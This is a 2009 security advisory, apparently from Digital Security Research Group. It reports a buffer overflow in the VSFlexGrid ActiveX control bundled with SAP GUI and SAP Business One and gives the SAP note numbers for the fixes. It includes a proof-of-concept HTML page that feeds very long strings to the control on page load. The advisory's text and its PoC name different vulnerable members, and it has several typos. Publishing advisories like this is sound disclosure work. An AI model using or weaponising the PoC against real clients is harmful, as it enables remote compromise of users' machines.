@@ -1,0 +1,136 @@
+Application:                    SAP GUI VSFlexGrid.VSFlexGridL (Part of SAP GUI, SAP BO 2005, SAP BO 2007 )
+Versions Affected:              SAP GUI VSFlexGrid Activex Control sp<=14
+Vendor URL:                     http://SAP.com
+Bugs:                           Buffer Overflovw
+Exploits:                       YES
+Reported:                       26.11.2008
+Vendor response:                27.11.208
+Public Advisory:                06.10.2009
+Originaly found by:             Elazar Broad
+Author:                         Alexander Polyakov from Digital Security Research Group [DSecRG]
+
+Description
+***********
+
+Component VSFlexGrid vulnerable to Buffer Overflow which was published in 2007 and not patched in SAPGUI untill this moment.
+This component and included in default SAPGUI installation.
+
+Details
+*******
+
+Information about this vulnerability in public since 2007 (http://www.securityfocus.com/bid/26467/info)
+We found that wulnerable component VSFlexGrid is still not patched and is using in default SAP GUI Client installations
+
+Tested on:
+ SAP Business One 2007  Client
+ SAP Business One 2005 Client
+ SAP GUI 7.10 (7100.2.7.1038)
+
+
+So every SAP client is vulnerable to remote buffer overflow. 
+
+
+Attacker can construct html page which call vulnerable function "Acrchive" from ActiveX Object VSFlex7L 
+with long parameter "ArcFileName".
+
+
+
+ActiveX component:      VSFlexGrid 
+path:                   c:\program files\sap\frontend\sapgui\vsflex7l.ocx
+object classid:         C0A63B86-4B21-11D3-BD95-D426EF2C7949
+
+
+prototype  = "Sub Archive ( ByVal ArcFileName As String ,  ByVal FileName As String ,  ByVal Action As ArchiveSettings )"
+memberName = "Archive"
+progid     = "VSFlex7L.VSFlexGrid"
+argCount   = 3
+
+
+Example
+*******
+
+from 
+
+<!--
+written by e.b.
+-->
+<html>
+ <head>
+  <script language="JavaScript" DEFER>
+    function Check() {
+     var s = "AAAA";
+
+     while (s.length < 262145) s=s+s;
+  
+     var obj = new ActiveXObject("VSFlexGrid.VSFlexGridL");
+     
+     obj.Text = s;
+     obj.EditSelText = s; 
+     obj.EditText = s;
+     obj.CellFontName = s;
+   }
+  </script>
+
+ </head>  
+ <body onload="JavaScript: return Check();" />
+</html>
+
+
+
+
+Fix Information
+***************
+SAP have two different SAP notes to address this issue:
+
+FOR SAP Business One Client 
+        The security issue is addressed with SAP note 1327004 (patch was released on July 8, 2009)
+For SAP GUI
+         The security issue is addressed with SAP note 1092631 (patch was released on July 25, 2008)
+
+
+
+References
+**********
+
+http://dsecrg.com/pages/vul/show.php?id=117
+https://service.sap.com/sap/support/notes/1327004
+https://service.sap.com/sap/support/notes/1092631
+http://www.securityfocus.com/bid/26467/info
+
+
+About
+*****
+
+Digital Security is one of the leading IT security companies in CEMEA, providing information security consulting, audit and penetration testing services, risk analysis and ISMS-related services and certification for ISO/IEC 27001:2005 and PCI DSS standards. Digital Security Research Group focuses on application and database security problems with vulnerability reports, advisories and whitepapers posted regularly on our website.
+
+
+Contact:        research [at] dsecrg [dot] com
+                http://www.dsecrg.com
+
+
+
+
+
+
+
+
+
+
+Regards,
+Digital Security Research Group [DSecRG]
+________________________________________
+DIGITAL SECURITY
+tel/fax: +7(812)703-1547
+tel:     +7(812)430-9130
+e-mail:  research@dsecrg.com
+web:     www.dsecrg.com
+----------------------------------------
+This message and any attachment are confidential and may be privileged 
+or otherwise protected from disclosure. If you are not the intended 
+recipient any use, distribution, copying or disclosure is strictly 
+prohibited. If you have received this message in error, please notify 
+the sender immediately either by telephone or by e-mail and delete this 
+message and any attachment from your system. Correspondence via e-mail 
+is for information purposes only. Digital Security neither makes nor 
+accepts legally binding statements by e-mail unless otherwise agreed. 
+----------------------------------------
